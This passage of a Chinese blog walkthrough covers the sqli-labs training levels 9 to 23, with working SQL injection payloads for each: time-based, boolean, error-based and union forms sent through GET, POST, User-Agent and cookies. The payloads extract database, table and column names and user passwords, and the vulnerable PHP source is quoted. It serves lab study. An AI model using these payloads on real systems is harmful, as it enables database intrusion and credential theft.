class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 1. 二分</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;0, sleep(3), 1) --+ # 延时，正常执行</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;0, sleep(3), 1) --+ # 不延时</span><br><span class="line"># 用来测试if语句是否正常执行</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;10, sleep(3), 1) --+ # 不延时</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;5, sleep(3), 1) --+  # 延时，代表在 5, 10 之间</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;8, sleep(3), 1) --+  # 不延时，在 [8, 5)</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+  # 延时，长度为8</span><br><span class="line"></span><br><span class="line">#2. 逐个测试</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;1, sleep(3), 1) --+  </span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;2, sleep(3), 1) --+  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LEFT(str,len) 返回最左边的 len 个字符的字符串，或者 NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select left(&#39;foobarbar&#39;, 5);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(&#39;foobarbar&#39;, 5) |</span><br><span class="line">+----------------------+</span><br><span class="line">| fooba                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 left 来爆破数据库的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;a&#39;, sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;b&#39;, sleep(3), 1) --+</span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 1) --+ # 明显延时</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 2)&#x3D;&#39;sa&#39;, sleep(3), 1) --+ </span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 2)&#x3D;&#39;se&#39;, sleep(3), 1) --+ </span><br><span class="line"></span><br><span class="line"># 类似上面的方法，慢慢的增加长度，修改需要对比的字符串，可以得到完整的数据库名</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+ # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>爆表名的 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; , sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意：limit N,M : 相当于 limit M offset N , 从第 N 条记录开始（从0开始）, 返回 M 条记录。这里使用的limit x,1 查询第x个表名。</p></li><li><p>爆字段名的 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39;, sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 9,1),8)&#x3D;&#39;username&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>爆数据的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; , sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; , sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>将单引号改为双引号即可，其他相同。</p><hr><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>11 到 21 关都是 POST 型，使用 Hackbar 可以方便的发送 POST 数据</p><ul><li>Chrome 有免费的 Hackbar</li><li>firefox 的 Hackbar 可以考虑用这个项目：<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li></ul><p>基本操作：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B152DCD1-244C-418E-B784-37A5A28A0280.png"><br>enctype 属性：规定在发送到服务器之前应该如何对表单数据进行编码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114174430.png"></p><hr><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>当我尝试使用 Hackbar 提交表单，Hackbar 给出 form.submit is not a function 的错误信息。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C3EB6EAC-10A7-43B1-8C43-7E168C81A664.png"><br>解决方法：将表单中的 &amp;submit=Submit 删掉。</p><p>后面按照回显方式的由易到难进行测试，这题能正常回显用户名和密码，说明可以正常使用联合注入进行回显。</p><ul><li><p>联合注入 Payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dum&#39; union select 1, 2 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>报错注入Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</span><br><span class="line"># 数据库版本</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"># 数据库名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)--+</span><br><span class="line"># 表名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1)--+</span><br><span class="line"># 字段名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class="line"># 数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到回显XPATH syntax error: ‘<del>8.0.19</del>‘，即可以进行报错注入，爆破信息同上面的方法。</p></li><li><p>布尔注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and 1&#x3D;1--+ # 正常登陆</span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and 1&#x3D;2--+ # 登陆错误</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里非常类似前面 GET 的基于布尔的字符型注入。延时注入是基于布尔注入的，当界面无法进行回显的时候才会考虑使用延时注入。</p></li></ul><hr><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>闭合方式：<code>password=(&#39;$passwd&#39;)</code></p><p>类似上题只使用一个单引号进行闭合，来观察报错信息，根据报错信息来进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就能看到如下报错信息<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B22699CD-05DD-41B8-A46E-19C3EB9BE8ED.png"><br>可以从上图看到，在单引号之后有一个单引号和括号，说明这题需要使用括号。</p><p>再次尝试闭合SQL语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正常登陆后，这题并没有显示查询结果，只是显示你是否登陆，所以不能使用联合注入。</p><p>尝试报错注入（报错注入通过报错信息进行回显）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据回显结果可以看出：该题能正常回显报错信息，即可以进行报错注入。</p><p>尝试时间盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  and if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能发现有明显的等待，即可以进行时间盲注。</p><hr><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>闭合方式：<code>password=&quot;$passwd&quot;</code></p><p>类似前面的步骤进行测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以通过 报错信息观察到 SQL 语句的局部，通过局部来推测自己的SQL应该如何写。</p><p>报错注入 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot; and if(length(database())&#x3D;8, sleep(3), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式：<code>password=&#39;$passwd&#39;</code></p><p>尝试使用前面的步骤回显出 SQL 语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没有回显报错信息，而且都登陆失败，猜测可能关闭和报错的输出</p><p>尝试直接注释，如果能SQL注入，那么用户名正确就能登陆系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登陆成功。</p><p>我们可以在后面拼接 and，and 之后的值为 true 就会正常登陆，值为 false 就登陆失败。（我们拼接的 SQL 语句都在 where 后，where 语句的功能就是根据布尔值进行筛选）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; and 1&#x3D;1  --+</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; and 1&#x3D;2  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式：<code>password=(&quot;$passwd&quot;)</code></p><p>方法同上</p><hr><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>闭合方式：<code>password = &#39;$passwd&#39;</code></p><p>进行简单测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>并没有结果返回</p><p>查看源码后发现，在执行SQL语句之前对输入的用户名做了检查。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><ul><li>magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。在 magic_quotes_gpc = On 的情况下，如果输入的数据有：<ol><li>单引号（’）</li><li>双引号（”）</li><li>反斜线（\）</li><li> NULL（NULL 字符）<br>（字符都会被加上反斜线）</li></ol></li><li>stripslashes() 删除由 addslashes() 函数添加的反斜杠</li><li>ctype_digit() 判断是不是数字，是数字就返回 true，否则返回 false</li><li>mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符。</li><li>intval()   整型转换</li></ul><p>但是没有对密码进行限制，password被直接拼接到SQL语句中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后发现使用 <code>passwd=Dumb&#39; and 1=1 --+&amp;uname=Dumb</code> 会发生报错并将报错信息进行显示。发送下面的数据，就可以进行报错注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&#39; and updatexml(1, concat(0x7e, user(), 0x7e), 1) --+&amp;uname&#x3D;Dumb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&#39;  WHERE username&#x3D;&#39;Dumb&#39; and if(1, sleep(3), 2) --+&amp;uname&#x3D;Dumb # 明显延时</span><br><span class="line">passwd&#x3D;Dumb&#39;  WHERE username&#x3D;&#39;Dumb&#39; and if(0, sleep(3), 2) --+&amp;uname&#x3D;Dumb</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p><p>登陆之后，发现查询到的信息是 User-agent，尝试在 Hackbar 添加 Header。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/65A5263E-2378-4E6B-BAEF-B7C5F43C18A9.png"><br>发现报错信息，说明可以采用报错注入的方式获得回显信息。</p><p>尝试闭合SQL语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1&#39; and sleep(3) --+</span><br><span class="line">1&#39; and sleep(3) #</span><br><span class="line">1&#39; and sleep(3) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>并没有收获</p><p>查看源码后发现 password 和 username 都被上一题的检查函数所检查，而 User-agent 在另一个 SQL 语句（插入数据）中，所以不管怎么包裹都无法在 INSERT 语句中得到回显。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8BF2BB30-E839-4B64-AF48-5BD66400980E.png"><br>故需要换一种闭合方式（在两侧进行闭合）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and sleep(3) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将 INSERT 语句闭合成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;&#39; and sleep(3) and &#39;&#39;, &#39;127.0.0.1&#39;, &#39;Dumb&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>uagent 字段就会被插入’’和’’进行与运算的结果（即0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select &#39;&#39; and sleep(3) and &#39;&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| &#39;&#39; and sleep(3) and &#39;&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      0 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错注入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p><p>同上题配置，仅字段不同，报错注入 Payload<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B2E0F540-D020-4071-8CEC-6350DF9B793E.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>闭合方式：<code>username=&#39;$cookee&#39;</code></p><p>推荐插件 <code>EditThisCookie</code></p><p>登陆之后，网页中存储了键为 Dumb、值为 Dumb的 Cookie。修改 Cookie 值之后，进行刷新就能看见报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 修改Cookie的值为</span><br><span class="line">Dumb&#39; #</span><br><span class="line"># 这里不能使用 --+。原因：+ 号在 Cookie 中不会被 URL 解码为空格可以采用下面这种方式。</span><br><span class="line">Dumb&#39;--%20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试回显的字段</span><br><span class="line">Dum&#39; union select 1, 2, 3--%20</span><br><span class="line"># 查看数据库</span><br><span class="line">Dum&#39; union select 1, 2, database()--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>联合注入 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dum&#39; union select 1, 2, database()--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错注入 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dum&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔盲注 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dumb&#39; and if(database()&#x3D;&#39;security&#39;, 1, 0)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dumb&#39; and if(database()&#x3D;&#39;security&#39;, sleep(3), 0)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="3-高级注入-21-37"><a href="#3-高级注入-21-37" class="headerlink" title="3 高级注入(21-37)"></a>3 高级注入(21-37)</h1><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>闭合方式：<code>username=(&#39;$cookee&#39;)</code></p><p>关键词：cookie、base64加密、单引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 进行简单的闭合</span><br><span class="line">Dumb&#39;) #</span><br><span class="line"># base64加密后：RHVtYicpICM&#x3D;</span><br><span class="line"></span><br><span class="line"># Union注入Payload</span><br><span class="line">Dum&#39;) union select 1, 2, 3#</span><br><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">Dum&#39;) and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- （最后有一个空格，也可以使用#）</span><br><span class="line"># base64加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0g</span><br><span class="line"># 没有空格加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0&#x3D;</span><br><span class="line"></span><br><span class="line"># 时间盲注Payload</span><br><span class="line">Dumb&#39;) and if(database()&#x3D;&#39;security&#39;, sleep(3), 0)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>闭合方式： <code>username=&quot;$cookee&quot;</code></p><p>关键词：cookie、base64加密、双引号</p><p>同上一题，将单引号和括号改为双引号即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Union注入Payload</span><br><span class="line">Dum&quot; union select 1, 2, 3#</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：基于错误、过滤注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 尝试进行闭合（注释被替换成为空）</span><br><span class="line">?id&#x3D;1&#39; and sleep(3) and &#39;1</span><br><span class="line"></span><br><span class="line"># 国光大师傅的Payload：</span><br><span class="line">?id&#x3D;-1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span 